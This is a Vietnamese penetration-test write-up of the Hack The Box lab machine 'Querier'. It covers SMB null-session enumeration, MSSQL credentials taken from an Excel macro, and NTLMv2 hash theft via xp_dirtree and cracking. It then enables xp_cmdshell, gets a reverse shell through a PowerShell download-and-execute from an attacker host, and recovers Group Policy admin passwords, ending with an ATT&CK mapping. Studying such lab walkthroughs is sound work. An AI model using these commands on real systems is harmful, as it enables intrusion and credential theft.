# Report For Querier

# Table of Content

# 1. Technical Details

## 1.1 Reconnaissance

### Nmap scan

Đầu tiên, thực hiện scan port và các service bằng `nmap`

```bash
# nmap -sC -sV -p- 10.129.174.78
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-27 21:30 EDT
Nmap scan report for 10.129.174.78
Host is up (0.056s latency).
Not shown: 65296 closed tcp ports (reset), 225 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-ntlm-info:
|   10.129.174.78:1433:
|     Target_Name: HTB
|     NetBIOS_Domain_Name: HTB
|     NetBIOS_Computer_Name: QUERIER
|     DNS_Domain_Name: HTB.LOCAL
|     DNS_Computer_Name: QUERIER.HTB.LOCAL
|     DNS_Tree_Name: HTB.LOCAL
|_    Product_Version: 10.0.17763
| ms-sql-info:
|   10.129.174.78:1433:
|     Version:
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49671/tcp open  unknown
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2024-09-28T01:32:10
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
|_clock-skew: mean: -1s, deviation: 0s, median: -1s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 206.58 seconds
```

Giải thích flag:

- `-sV` : Kiểm tra các cổng mở để xác định thông tin dịch vụ/phiên bản
- `-sC` : Sử dụng script mặc định
- `-p-` : Tất cả các port

Dựa vào kết quả của `nmap` , ta có các thông tin đáng chú ý sau

- Target là Window Server 2017
- Có các services:
    - RPC port 135
    - SMB port 139,445
    - MSSQL port 1443 có các thông tin
        - Tên máy: QUERIER
        - Domain: HTB.LOCAL
        - Phiên bản Microsoft SQL Server 2017 RTM

### SMB enumeration

**Null sessions**

Sử dụng `smbclient` để kiểm tra, với null sessions ta hoàn toàn có thể login và xem các file được chia sẻ. 

```bash
# smbclient -N -L //10.129.174.78

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        Reports         Disk
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.174.78 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

Giải thích flag: 

- `-N` : Đăng nhập với Null session
- `-L`: List các file/folder

Trong 4 folders mà ta đã listing ra được thì chỉ duy nhất folder `Reports` cho phép listing với null sessions và get file `Currency Volume Report.xlsm` ở trong folder này.

```bash
# smbclient -N //10.129.174.78/Reports
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Mon Jan 28 18:23:48 2019
  ..                                  D        0  Mon Jan 28 18:23:48 2019
  Currency Volume Report.xlsm         A    12229  Sun Jan 27 17:21:34 2019

                5158399 blocks of size 4096. 850720 blocks available
smb: \> get "Currency Volume Report.xlsm"
getting file \Currency Volume Report.xlsm of size 12229 as Currency Volume Report.xlsm (41.9 KiloBytes/sec) (average 41.9 KiloBytes/sec)
```

Ta có thể `unzip` file này bởi vì nó là tệp Excel hỗ trợ macro và được lưu dưới dạng một file nén ZIP chứa nhiều file và folder con bên trong. 

```bash
# unzip Currency\ Volume\ Report.xlsm
Archive:  Currency Volume Report.xlsm
  inflating: [Content_Types].xml
  inflating: _rels/.rels
  inflating: xl/workbook.xml
  inflating: xl/_rels/workbook.xml.rels
  inflating: xl/worksheets/sheet1.xml
  inflating: xl/theme/theme1.xml
  inflating: xl/styles.xml
  inflating: xl/vbaProject.bin
  inflating: docProps/core.xml
  inflating: docProps/app.xml
```

Dựa trên kết quả đã `unzip` được thì có 1 file dùng để chứa các macro và module mà người dùng tạo ra trong Excel nhưng không thể đọc bằng `cat` được do hiện tại đang được lưu bằng dạng nhị phân. Nên cần đổi qua dạng ta có thể đọc được. 

```bash
# strings xl/vbaProject.bin > macros.txt && cat macros.txt
 macro to pull data for client volume reports
n.Conn]
Open
rver=<
SELECT * FROM volume;
word>
 MsgBox "connection successful"
Set rs = conn.Execute("SELECT * @@version;")
Driver={SQL Server};Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc$c6
 further testing required
Attribut
e VB_Nam
e = "Thi
sWorkboo
0{00020P819-
$0046}
|Global
Spac
dCreat
Pred
ecla
BExpo
Templ
ateDeriv
Bustomi
acro to @pull d
for clie
nt volu
reports
further
 testing@ requi
ub Conne
ct()
 As A DODB.
iohn
ecordset
Dr={SQ
L Server
=QUER
IER;@Bste
d_G#=no;D
@;Uid
<;Pwd=
PcwTWTHR
wryjc$c6
!TimeouBt
J= ad#B
' MsgBox
J su
ccessfulq@
Exec
SELECT *( @@
b @Bt
OMD~E
heet
s(1).Ran
ge("A1")
@\pyFrom
$rs.Cl
nEnd IfE
Attribut
e VB_Nam
e = "She@et1"
t0{000
20820-
$0046
|Global!
Spac
dCrea
tabl
Pre decla
BExp
Temp
lateDeri
Bustom
Excel
Win16
Win32
Win64x
VBA6
VBA7
Project1
stdole
VBAProject
Office
ThisWorkbook|
_Evaluate
Sheet1
Connect\
Workbookk
connu
ADODBs
Connection
Recordset
ConnectionString
ConnectionTimeout
State
adStateOpen
ExecuteY
Sheets
Range
CopyFromRecordsetV
Worksheet
VBAProje
stdole>
*\G{00
020430-
6}#2.0#0
#C:\Wind
ows\Syst em32\
tlb#OLE
Automati
EOffDic
2DF8D04C
-5BFA-10
1B-BDE5
gram Fil
es\Commo
Micros
oft Shar
ed\OFFIC
E16\MSO.0DLL#
M 1@6.0 Ob
Library
ThisW
orkbookG
1Bxq
Sheet1G
S@#e@Xt
ThisWorkbook
Sheet1
ID="{7819C482-CC73-4FB3-8245-31BB2E19C38A}"
Document=ThisWorkbook/&H00000000
Document=Sheet1/&H00000000
HelpFile=""
Name="VBAProject"
HelpContextID="0"
VersionCompatible32="393222000"
CMG="191BC9EFCDEFCDEFCDEFCD"
DPB="8D8F5D2BA59EA69EA69E"
GC="0103D1D2D2D2D22D"
[Host Extender Info]
&H00000001={3832D640-CF90-11CF-8E43-00A0C911005A};VBE;&H00000000
[Workspace]
ThisWorkbook=26, 26, 1062, 609, C
Sheet1=52, 52, 1088, 635, C
```

Dựa trên kết quả ta thu được credentials sau :

```bash
Driver={SQL Server};Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc$c6
```

### RPC enumeration

Cũng giống như việc enum SMB, ta sẽ kiểm tra liệu service có cho phép anonymous login không (còn được gọi là Null Sessions) bằng `rpcclient`.

```bash
# rpcclient -U "" -N 10.129.174.78
rpcclient $>
```

Giải thích flags:

- `-U ""` username để login vào
- `-N` no pass hay password rỗng

Với kết quả trên đồng nghĩa là target cho phép ta kết nối. Nhưng lại không có quyền để thực thi command.

```bash
# rpcclient -U "" -N 10.129.174.78 -c "enumdomusers"
do_cmd: Could not initialise samr. Error was NT_STATUS_ACCESS_DENIED
```

### Summary

Tới đây, ta có thông tin đăng nhập MSSQL server. Ta sẽ có 1 hướng tiếp cận login vào MSSQL.

 

## 1.2 Initial Access

### MSSQL Login (user reporting)

Kết nối thành công, nhưng lại không thể thực thi các lệnh gì do không có quyền chạy command với `xp_cmdshell` . 

```bash
# impacket-mssqlclient 'reporting:PcwTWTHRwryjc$c6@10.129.174.78' -windows-auth
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: volume
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(QUERIER): Line 1: Changed database context to 'volume'.
[*] INFO(QUERIER): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232)
[!] Press help for extra shell commands
SQL (QUERIER\reporting  reporting@volume)>
```

### Steal NTLM hash

Trước tiên ta cần chuẩn bị server SMB ở máy attacker: 

```bash
# impacket-smbserver SHARE . -smb2support
```

Sau đó ta thực hiện chạy `xp_dirtree \\10.10.14.5\SHARE\` để buộc server nạn nhân phải xác thực với máy attacker bằng NTLM. 

Kết quả thu được: 

```bash
# impacket-smbserver SHARE . -smb2support
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.129.174.78,49675)
[*] AUTHENTICATE_MESSAGE (QUERIER\mssql-svc,QUERIER)
[*] User QUERIER\mssql-svc authenticated successfully
[*] mssql-svc::QUERIER:aaaaaaaaaaaaaaaa:d928dd3184c5cc70ddc1b568697adc05:010100000000000000fc37214e11db01f0cd010f7157968300000000010010006e004b00430066004500530048006200030010006e004b00430066004500530048006200020010006f0055004500470064006f0066005200040010006f0055004500470064006f00660052000700080000fc37214e11db01060004000200000008003000300000000000000000000000003000007f581169c6700e66ef94aa0fbdd4d52bb2f3eded82e25720eac3289b20d40f0a0a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e003500000000000000000000000000
```

→ Thu được NTLMv2 hash của user `mssql-svc`

### Crack Password

Có thể sử dụng `john` hoặc `hashcat` để crack NTLMv2 hash với wordlist `rockyou.txt`

```bash
# john -w=/usr/share/wordlists/rockyou.txt NTLMv2Hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
corporate568     (mssql-svc)
1g 0:00:00:04 DONE (2024-09-28 06:28) 0.2164g/s 1939Kp/s 1939Kc/s 1939KC/s correforenz..cornamuckla
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```

→ Ta đã có credentials của user `mssql-svc:corporate568`

### MSSQL Login (user mssql-svc)

Sử dụng credentials của user `mssql-svc` để đăng nhập và thực hiện cho phép thực hiện shell command  thành công: 

```bash
# impacket-mssqlclient 'mssql-svc:corporate568@10.129.174.78' -windows-auth
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(QUERIER): Line 1: Changed database context to 'master'.
[*] INFO(QUERIER): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
[!] Press help for extra shell commands
SQL (QUERIER\mssql-svc  dbo@master)> enable_xp_cmdshell
[*] INFO(QUERIER): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
[*] INFO(QUERIER): Line 185: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.
```

Ta có thể kiểm tra liệu user hiện tại có phải system admin không: 

```bash
SQL (QUERIER\mssql-svc  dbo@master)> select IS_SRVROLEMEMBER('sysadmin')
    
-   
1
```

Thực hiện lấy flag của user:

```bash
SQL (QUERIER\mssql-svc  dbo@master)> xp_cmdshell type c:\users\mssql-svc\desktop\user.txt
output                             
--------------------------------   
e9090a6c97e49fbf8ab6058e6a0110e4   

NULL
```

## 1.3 Privilege Escalation

### Reverse Shell

Đầu tiên ta cần phải móc reverse shell về để chạy script tìm hướng leo quyền. Ở trên máy attacker: 

- Tạo shell móc ngược kết nối ở port 8000
- Lắng nghe ở port 8000 với command `rlwrap -cAr nc -lvp 8000`
- Tạo HTTP server port 80 với command `sudo python3 -m http.server 80`

Chạy lệnh để lấy file từ máy attacker: 

```bash
SQL (QUERIER\mssql-svc  dbo@master)> xp_cmdshell powershell IEX(New-Object Net.WebClient).downloadstring(\"http://10.10.14.5/shell.ps1\")
```

→ Đã có reverse shell

### PowerUp - Collect Credentials

Tải script `PowerUp.ps1` về máy nạn nhân để tìm các credentials và hướng đi có thể leo quyền

```bash
PS C:\Windows\system32>IEX(New-Object Net.WebClient).downloadstring('http://10.10.14.16/PowerUp.ps1')
```

Thực thi với command: `Invoke-AllChecks`

Kết quả sau khi script `PowerUp.ps1` được thực thi: 

```bash
Privilege   : SeImpersonatePrivilege
Attributes  : SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
TokenHandle : 2432
ProcessId   : 312
Name        : 312
Check       : Process Token Privileges

ServiceName   : UsoSvc
Path          : C:\Windows\system32\svchost.exe -k netsvcs -p
StartName     : LocalSystem
AbuseFunction : Invoke-ServiceAbuse -Name 'UsoSvc'
CanRestart    : True
Name          : UsoSvc
Check         : Modifiable Services

ModifiablePath    : C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps
IdentityReference : QUERIER\mssql-svc
Permissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
%PATH%            : C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps
Name              : C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps
Check             : %PATH% .dll Hijacks
AbuseFunction     : Write-HijackDll -DllPath 'C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps\wlbsctrl.dll'

UnattendPath : C:\Windows\Panther\Unattend.xml
Name         : C:\Windows\Panther\Unattend.xml
Check        : Unattended Install Files

Changed   : {2019-01-28 23:12:48}
UserNames : {Administrator}
NewName   : [BLANK]
Passwords : {MyUnclesAreMarioAndLuigi!!1!}
File      : C:\ProgramData\Microsoft\Group
            Policy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\Groups.xml
Check     : Cached GPP Files
```

→ Đã có credentials của user `Administrator:MyUnclesAreMarioAndLuigi!!1!`

Thực hiện kết nối đến server với credentials vừa thu được và lấy flag `root.txt`

```bash
# smbclient //10.129.174.78/C$ -U Administrator --password='MyUnclesAreMarioAndLuigi!!1!'
Try "help" to get a list of possible commands.
smb: \> cd users\Administrator\Desktop\
smb: \users\Administrator\Desktop\> ls
  .                                  DR        0  Mon Jan 28 19:04:15 2019
  ..                                 DR        0  Mon Jan 28 19:04:15 2019
  desktop.ini                       AHS      282  Mon Jan 28 17:46:21 2019
  root.txt                           AR       34  Fri Sep 27 21:20:40 2024

                5158399 blocks of size 4096. 842654 blocks available
smb: \users\Administrator\Desktop\> get root.txt
getting file \users\Administrator\Desktop\root.txt of size 34 as root.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
smb: \users\Administrator\Desktop\> exit

# cat root.txt
9dacdd79d808106cddc4c545bdc05f2e
```

# 2. Summary - Mapping MITRE ATT&CK

## *Tactics: Reconnaissance*

| **Threat Actor Technique / Sub-Techniques** | **Threat Actor Procedure(s)** |
| --- | --- |
| **Active Scanning [[T1595](https://attack.mitre.org/techniques/T1595/)]** | Kẻ tấn công đã thực hiện trinh sát target để thu thập các thông tin sơ lược như IP, các port được mở và các service tương ứng. 

Từ đó mà kẻ tấn công đã thu thập được thông tin của target để phục vụ cho các giai đoạn sau |

## *Tactics: Credential Access*

| **Threat Actor Technique / Sub-Techniques** | **Threat Actor Procedure(s)** |
| --- | --- |
| **Adversary-in-the-Middle  [**[T1557](https://attack.mitre.org/techniques/T1557)]                                                                                                 **LLMNR/NBT-NS Poisoning SMB Relay** [[T1557.1](https://attack.mitre.org/techniques/T1557/001/)]  | Kẻ tấn công ép target phải authenticate với máy của kẻ tấn công.
Từ đó mà kẻ tấn công đã thu thập được NTLMv2 hash của user đang tồn tại trên target để phục vụ cho các giai đoạn sau |
| **Brute Force** [[T1110](https://attack.mitre.org/techniques/T1110/)]                                                                          **Password Cracking** [[T1110.2](https://attack.mitre.org/techniques/T1110/002/)] | Kẻ tấn công đã thực hiện crack NTLMv2 hash của password của user đang tồn tại trên target để phục vụ cho các giai đoạn sau. |
| **Unsecured Credentials [**[T1552](https://attack.mitre.org/techniques/T1552/)**]                                            Group Policy Preferences [**[T1552.6](https://attack.mitre.org/techniques/T1552/006/)] | Kẻ tấn công thực hiện tìm các unsecured credentials trong Group Policy Preferences để leo quyền admin |